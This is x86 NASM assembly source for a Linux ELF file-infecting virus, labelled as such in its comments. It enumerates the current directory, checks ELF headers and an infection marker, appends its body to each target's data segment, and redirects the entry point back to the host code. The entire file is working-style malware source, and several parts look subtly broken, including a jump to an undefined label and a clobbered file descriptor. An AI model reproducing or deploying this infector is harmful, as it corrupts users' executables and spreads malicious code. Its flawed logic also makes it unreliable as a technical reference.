section .text
    global v_start

v_start:
    ; virus start

    mov ecx, 2328
    ; 2080-2328     elf_targets' content space
    ; 1056-2080     elf_targets space
    ; 32-1056       all stuff space
    ; 0-32          buffer(all of the unsure targets' name)
    
fake_space:         ; create fake space in stack
    push 0x00
    sub ecx, 1      ; decrease counter
    cmp ecx, 0
    jbe fake_space
    mov edi, esp    ; edi = esp

    call scan_folder
    db ".", 0

scan_folder:
    ; into current folder
    pop ebx         
    mov esi, 0      ; reset offset for targets
    mov eax, 5      ; sys_open
    mov ecx, 0
    mov edx, 0
    int 80h

    cmp eax, 0      ; check fd (eax)
    jbe v_stop      ; if fd = 0, error open foilder,  Exit virus

    ; get files to edi+32
    mov ebx, eax
    mov eax, 0xdc   ; sys_getdents64
    mov ecx, edi    ; 
    add ecx, 32     ; ecx = edi+32
    mov edx, 1024
    int 80h

    ; close folder
    mov eax, 6      
    int 80h

    xor ebx, ebx    ; counter for find_filename_start

find_filename_start:
    inc ebx

    ; check not over 1024(1056-32)
    cmp ebx, 1024
    jge infect

    ; 0x00 0x08 occurs before the start of a filename
    cmp byte [edi+32+ebx], 0x00
    jnz find_filename_start
    inc ebx
    cmp byte [edi+32+ebx], 0x08
    jnz find_filename_start

    xor ecx, ecx    ; clear out ecx
    ; ./ for full path
    mov byte [edi+ecx], 0x2e
    inc ecx
    mov byte [edi+ecx], 0x2f
    inc ecx

copy_filename:              ; until we find the end of filename
    inc ebx
    cmp ebx, 1024
    jge infect

    ; copy file name
    push esi                ; save target offset
    push edi                ; save fake space pointer

    mov esi, edi            
    add esi, 32             ; esi = edi+32
    add esi, ebx            ; esi = edi+32+ebx  
    add edi, ecx            ; edi = edi+ecx(up on ./)
    movsb                   ; moved a byte to buffer
    
    pop edi                 ; restore fake space pointer
    pop esi                 ; restore target offset
    inc ecx                 ; increment offset of the filename character we have stored 

    ; 0x00 is the end of a filename
    cmp byte [edi+32+ebx], 0x00
    jnz copy_filename       ; didn't find the end, keep copying filename 

    mov byte [edi+ecx], 0x00 ; after finding the end, add a 0x00 to the end

    push ebx                ; save offset in all stuff space
    call scan_file          ; when we hit retuen, we will come back here
    pop ebx                 ; restore our offset in buffer

    jmp find_filename_start ; find next file

scan_file:
    ; check the file
    mov eax, 5      ; sys_open
    mov ebx, edi    ; path (offset to filename)
    mov ecx, 0      ; O_RDONLY
    int 80h

    cmp eax, 0      ; check if fd in eax > 0 (ok)
    jbe return      ; cannot open file.  Return

    mov ebx, eax    ; fd
    mov eax, 3      ; sys_read
    mov ecx, edi    
    add ecx, 2080   ; read to edi+2080(elf_targets' content space)
    mov edx, 12     ; read 12 bytes, 0-3 bytes to check for the ELF header, 9-12 bytes to find signature
    int 80h

check_elf:
    mov ecx, 0x464c457f         ; .ELF in little-endian
    cmp dword [edi+2080], ecx   ; check the header whether it is ELF
    jnz close_file              ; not an ELF

    ; check whether it has been infected
    mov ecx, 0x00544143             ; "CAT "in little-endian, first of the infected marker
    cmp dword [edi+2080+8], ecx     ; marker should show up after the elf header offset 0x08, e_ident[EI_ABIVERSION] and e_ident[EI_PAD], which is unused

    mov ecx, 0x00544143             ; "HIS "in little-endian, second part of the infected marker
    cmp dword [edi+2080+12], ecx     ; marker should show up after the elf header offset 

    jz close_file                   ; signature exists.  Already infected.  Close file.

save_target:

    push esi        ; save targets offset
    push edi        ; save our fake space

    mov ecx, edi    ; ecx = edi temporarily place filename offset in ecx
    add edi, 1056
    add edi, esi    ; edi = edi+1056+esi
    mov esi, ecx    ; esi = ecx = edi
    mov ecx, 32     ; counter = 32, move 32bytes
    rep movsb       ; save targets in buffer

    pop edi         ; restore fake space
    pop esi         ; restore targets offset
    add esi, 32

close_file:
    mov eax, 6      ; sys_close
    int 80h

return:
    ret

start_infect:
    cmp esi, 0
    jbe v_stop              ; no targets

    sub esi, 32

    mov eax, 5              ; sys_open
    mov ebx, edi            
    add ebx, 1056           
    add ebx, esi            ; ebx = edi+1056+esi
    mov ecx, 2              ; O_RDWR
    int 80h

;read the elf target we have saved to edi+2080
read_content:               
    mov eax, 3              ; sys_read
    mov ebx, eax            ; fd
    mov ecx, edi
    add ecx, 2080           ; edi+2080
    mov edx, 1              ; read 1 byte everytime
    int 80h

    cmp eax, 0              ; 0 means end of file
    je eof

    mov eax, edi
    add eax, 9312           ; 2080 + 7232
    cmp ecx, eax            ; quit if the file is over 7232 bytes 
    jge start_infect

    add ecx, 1              ; read the next byte
    jmp read_content

eof:
    push ecx                ; store the last byte
    mov eax, 6              ; sys_close
    int 80h

; insert infected marker
marker:
    mov ecx, 0x00544143                 ; "CAT "in little-endian, first of the infected marker
    mov [edi+2080+8], ecx

; initialize for program_header_loop
    xor ecx, ecx
    xor eax, eax
    mov cx, word [edi+2080+44]     ; e_phnum
    mov eax, dword [edi+2080+28]   ; e_phoff
    sub ax, word [edi+2080+42]     ; eax = e_phoff - e_phentsize for loop

program_header_loop:
    ; loop through program headers and find the data segment

    add ax, word [edi+2080+42]          ; next program header
    cmp ecx, 0
    jbe start_infect                    ; no data segment, look for next target
    sub ecx, 1                          ; found one data segment, the number -1

    ; edi+2080+eax = Program header
    mov ebx, dword [edi+2080+eax]       ; p_type
    cmp ebx, 0x00000001                 ; PT_LOAD, imply it is a Data segment or Text segment
    jne program_header_loop             ; not PT_LOAD, look for next program header

    mov ebx, dword [edi+2080+eax+4]     ; p_offset
    cmp ebx, 0x2bf00                    ; imply it is a Data segment
    jne program_header_loop             ; not Data segment, look for next program header

    ; change entry point
    mov ebx, dword [edi+2080+24]        ; old entry point
    push ebx                            ; save the old entry point
    mov ebx, dword [edi+2080+eax+4]     ; p_offset
    mov edx, dword [edi+2080+eax+16]    ; p_filesz
    add ebx, edx                        ; ebx = p_offset + p_filesz, where to add virus
    push ebx                            ; save the offset to add virus
    mov ebx, dword [edi+2080+eax+8]     ; p_vaddr
    add ebx, edx                        ; ebx = p_vaddr + p_filesz, new entry point
    mov [edi+2080+24], ebx              ; overwrite the old entry point
    
    ; change file size
    add edx, v_stop - v_start           
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    add edx, 7                          ; edx =  p_filesz + size of virus + 7(for the jmp to original entry point)
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov [edi+2080+eax+16], edx          ; overwrite the old p_filesz

    ; resize in bytes of the segment in memory
    mov ebx, dword [edi+2080+eax+20]    ; p_memsz
    add ebx, v_stop - v_start           ; ebx = p_memsz + size of virus
    add ebx, 7                          ; for the jmp to original entry point
    mov [edi+2080+eax+20], ebx          ; overwrite the old p_memsz

; initialize for section_header_loop
    xor ecx, ecx
    xor eax, eax
    mov cx, word [edi+2080+48]          ; e_shnum
    mov eax, dword [edi+2080+32]        ; e_shoff
    sub ax, word [edi+2080+46]          ; eax = e_shoff - e_shentsize for loop

section_header_loop:
    ; loop through section headers and find the .bss section (NOBITS)

    add ax, word [edi+2080+46]          ; next section header
    cmp ecx, 0
    jbe end_infect                      ; no .bss section
    sub ecx, 1                          ; found one section header, the number -1

    ;check whether it is a .bss
    mov ebx, dword [edi+2080+eax+4]     ; sh_type
    cmp ebx, 0x00000008                 ; NOBITS imply it is a .bss section
    jne section_header_loop             ; not a .bss section

    ; overwrite Virtual address, for sections that are loaded.
    mov ebx, dword [edi+2080+eax+12]    ; sh_addr
    add ebx, v_stop - v_start           
    add ebx, 7                          ; ebx =  sh_addr + size of virus + 7(for the jmp to original entry point)
    mov [edi+2080+eax+12], ebx          ; overwrite the old sh_addr

    ; overwrite offset of the section
    mov edx, dword [edi+2080+eax+16]    ; sh_offset
    add edx, v_stop - v_start           
    add edx, 7                          ; edx =  sh_offset + size of virus + 7(for the jmp
    mov [edi+2080+eax+16], edx          ; overwrite the old sh_offset

end_infect:
    ; overwrite e_shoff
    mov ebx, dword [edi+2080+32]        ; ebx = e_shoff 
    add ebx, v_stop - v_start           
    add ebx, 7                          ; eax = e_shoff + size of virus + 7(for the jmp to original entry point)
    mov [edi+2080+32], ebx              ; overwrite the old e_shoff

write_back:
    mov eax, 5              ; sys_open
    mov ebx, edi            
    add ebx, 1056           
    add ebx, esi            ; ebx = edi + 1056 + target offset
    mov ecx, 2              ; O_RDWR
    int 80h

    mov ebx, eax            ; fd
    mov eax, 4              ; sys_write
    mov ecx, edi
    add ecx, 2080           ; ecx = edi+2080
    pop edx                 ; the offset where the virus resides
    int 80h
    mov [edi+7], edx        ; store the offset in buffer

; the absolute address of v_start will differ between host files
    call delta_offset
delta_offset:
    pop ebp
    sub ebp, delta_offset

    mov eax, 4                  ; sys_write
    lea ecx, [ebp + v_start]    ; copy address to ecx
    mov edx, v_stop - v_start   ; size of virus bytes
    int 80h

    pop edx                     ; original entry point of host
    mov [edi], byte 0xb8        ; op code for MOV EAX (1 byte)
    mov [edi+1], edx            ; original entry point (4 bytes)
    mov [edi+5], word 0xe0ff    ; op code for JMP EAX (2 bytes)

    mov eax, 4                  ; sys_write
    mov ecx, edi                ; offset to filename
    mov edx, 7                  ; 7 bytes for the final jmp to the original entry point
    int 80h

    mov eax, 4                  ; sys_write
    mov edx, dword [edi+7]   
    mov ecx, edi
    add ecx, 2080   
    add ecx, edx                ; ecx = edi + 2080 + dword [edi+7]
    pop edx                     ; offset of last byte
    sub edx, ecx                ; length of bytes to write
    int 80h

    mov eax, 36                 ; sys_sync
    int 80h

    mov eax, 6                  ; close file
    int 80h

    jmp infect

v_stop:
    mov eax, 1                  ; sys_exit
    mov ebx, 0                  ; normal status
    int 80h
